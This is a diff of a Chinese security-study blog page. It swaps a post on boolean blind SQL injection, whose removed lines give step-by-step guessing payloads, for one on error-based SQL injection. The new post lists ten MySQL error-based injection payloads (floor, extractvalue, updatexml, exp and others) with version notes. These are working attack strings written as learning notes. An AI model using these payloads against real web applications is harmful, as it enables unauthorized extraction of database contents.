@@ -10,9 +10,11 @@
 
     <!--Description-->
     
-        <meta name="description" content="前提12当页面没有输出内容的地方，无法使用union联合查询 和 报错注入，可以测试bool盲注bool盲注是基于条件真和假时，对页面异常判断，从而猜解数据
+        <meta name="description" content="前提12执行错误的sql语句，页面显示报错信息，提供页面 显示位置只显示报错信息，不显示内容，union联合查询没意义
 
-攻击步骤1、测试数据库中的数据库个数12select 1 and (select count(schema_name) from infor">
+报错注入1234固定payload直接用固定输出位核心是错误输出函数，floor()函数等基于页面有显示错误位置，可以输出信息
+
+使用手法：12数字型： 直接 and + 语句 ">
     
 
     <!--Author-->
@@ -22,7 +24,7 @@
 
     <!--Open Graph Title-->
     
-        <meta property="og:title" content="攻击手法3---Bool盲注">
+        <meta property="og:title" content="攻击手法2---报错注入">
     
 
     <!--Open Graph Description-->
@@ -44,7 +46,7 @@
 
     <!-- Title -->
     
-    <title>攻击手法3---Bool盲注 - XMD5 STUDY BLOG</title>
+    <title>攻击手法2---报错注入 - XMD5 STUDY BLOG</title>
 
     <!-- Tachyons Core CSS -->
     <link rel="stylesheet" href="https://unpkg.com/tachyons/css/tachyons.min.css">
@@ -100,8 +102,8 @@
     <!-- Title -->
     <div class="w-100 mw8 center vh-40 dt">
         <div class="dtc v-mid white">
-            <h1 class="f1-l f2-m tc tc-m tl-ns">攻击手法3---Bool盲注</h1>
-            <p class="f4 fw3 pab-100px tc tc-m tl-ns">2019-08-21</p>
+            <h1 class="f1-l f2-m tc tc-m tl-ns">攻击手法2---报错注入</h1>
+            <p class="f4 fw3 pab-100px tc tc-m tl-ns">2019-08-19</p>
         </div>
     </div>
 
@@ -127,18 +129,15 @@
                     
 
                     <!-- Main Post Content -->
-                    <h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当页面没有输出内容的地方，无法使用union联合查询 和 报错注入，可以测试bool盲注</span><br><span class="line">bool盲注是基于条件真和假时，对页面异常判断，从而猜解数据</span><br></pre></td></tr></table></figure>
+                    <h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行错误的sql语句，页面显示报错信息，提供页面 显示位置</span><br><span class="line">只显示报错信息，不显示内容，union联合查询没意义</span><br></pre></td></tr></table></figure>
 
-<h2 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h2><h4 id="1、测试数据库中的数据库个数"><a href="#1、测试数据库中的数据库个数" class="headerlink" title="1、测试数据库中的数据库个数"></a>1、测试数据库中的数据库个数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 1 and (select count(schema_name) from information_schema.schemata) &gt;i</span><br><span class="line">and两边的条件都为真时，页面正常显示，否则不正常显示，以此为依据，判断数据库个数（采用二分法判断）</span><br></pre></td></tr></table></figure>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">固定payload直接用</span><br><span class="line">固定输出位</span><br><span class="line">核心是错误输出函数，floor()函数等</span><br><span class="line">基于页面有显示错误位置，可以输出信息</span><br></pre></td></tr></table></figure>
 
-<h4 id="2、猜解库名"><a href="#2、猜解库名" class="headerlink" title="2、猜解库名"></a>2、猜解库名</h4><h5 id="判断库名长度"><a href="#判断库名长度" class="headerlink" title="判断库名长度"></a>判断库名长度</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用 limit 函数，每次取一个进行猜解</span><br><span class="line">select 1 and and length((select schema_name from information_schema.schemata limit 	 i,1)) &gt;k</span><br><span class="line">i从0开始，k是猜解的个数，成立显示正常，不成立显示异常</span><br></pre></td></tr></table></figure>
+<h3 id="使用手法："><a href="#使用手法：" class="headerlink" title="使用手法："></a>使用手法：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">数字型： 直接 and + 语句 +注释符</span><br><span class="line">   字符型： ’+[and+ 语句]+注释符</span><br></pre></td></tr></table></figure>
 
-<h5 id="判断不同位置的ascii码（一个一个判断）"><a href="#判断不同位置的ascii码（一个一个判断）" class="headerlink" title="判断不同位置的ascii码（一个一个判断）"></a><strong>判断不同位置的ascii码</strong>（一个一个判断）</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select 1 and ascii(mid((select schema_name from information_schema.schemata limit i,1),j,1)) &gt;k</span><br><span class="line">i从0开始，0代表第[i+1]个库名</span><br><span class="line">j从1开始，代表第j个字母</span><br><span class="line">k范围在ascii码范围内</span><br><span class="line"></span><br><span class="line">mid(string,1,1) 截取字符串，下标从一开始，往后截取一个             </span><br><span class="line">ascii()计算选择字母的ascii码，最后做判断，成立为真，不成立为假</span><br></pre></td></tr></table></figure>
+<h2 id="Mysql—十种常用报错语句"><a href="#Mysql—十种常用报错语句" class="headerlink" title="Mysql—十种常用报错语句"></a>Mysql—十种常用报错语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1.floor()</span><br><span class="line">	and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br><span class="line"></span><br><span class="line">2.extractvalue()</span><br><span class="line">	and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br><span class="line"></span><br><span class="line">3.updatexml()</span><br><span class="line">	and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br><span class="line"></span><br><span class="line">4.geometrycollection()</span><br><span class="line">	and geometrycollection((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">5.multipoint()</span><br><span class="line">	and multipoint((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">6.polygon()</span><br><span class="line">	and polygon((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">7.multipolygon()</span><br><span class="line">	and multipolygon((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">8.linestring()</span><br><span class="line">	and linestring((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">9.multilinestring()</span><br><span class="line">	and multilinestring((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">10.exp()</span><br><span class="line">	and exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure>
 
-<h4 id="3、用同样的方法去猜解表名，字段名，"><a href="#3、用同样的方法去猜解表名，字段名，" class="headerlink" title="3、用同样的方法去猜解表名，字段名，"></a>3、用同样的方法去猜解表名，字段名，</h4><p>​            后面加上相应的where条件，指定选中的数据库 和 表</p>
-<h4 id="4、猜解每个字段下的数据"><a href="#4、猜解每个字段下的数据" class="headerlink" title="4、猜解每个字段下的数据"></a>4、猜解每个字段下的数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select 1 and (select count(A字段) from 库名.表名)&gt;i-- x</span><br><span class="line">   count()判断 A字段中数据的条数</span><br><span class="line">   </span><br><span class="line">   select 1 and length((select [A字段] from 库名.表名 limit i,1))&gt;j-- x</span><br><span class="line">   limit限制了选择第几条数据（一条一条取出来），用length()判断长度</span><br><span class="line">       </span><br><span class="line">   select 1 and ascii(mid((select [A字段] from 库名.表名 limit i,1),j,1))&gt;k-- x</span><br><span class="line">   使用mid()函数将数据中字母一个一个取出来，用ascii()判断其ascii码，解出最终数据</span><br></pre></td></tr></table></figure>
-
-
+<h4 id="以下数据库版本及注入类型能使用以上语句相对应"><a href="#以下数据库版本及注入类型能使用以上语句相对应" class="headerlink" title="以下数据库版本及注入类型能使用以上语句相对应"></a>以下数据库版本及注入类型能使用以上语句相对应</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mariadb 5.5 数字型  1,2,3</span><br><span class="line">mysql 8.0   字符型报错注入 2，3</span><br><span class="line">mysql 5.0   字符型报错注入 1，2,3，4,5，6，7，8，9</span><br></pre></td></tr></table></figure>
                     
                     <!-- Tags Bottom -->
                     
@@ -179,11 +178,11 @@
     <h3>Recent Posts</h3>
     
         <p>
-            <a href="/2019/08/21/20190819/">攻击手法3---Bool盲注</a>
+            <a href="/2019/08/21/20190821/">攻击手法3---Bool盲注</a>
         </p>
     
         <p>
-            <a href="/2019/08/21/20190821/">攻击手法3---Bool盲注</a>
+            <a href="/2019/08/19/20190819/">攻击手法2---报错注入</a>
         </p>
     
         <p>
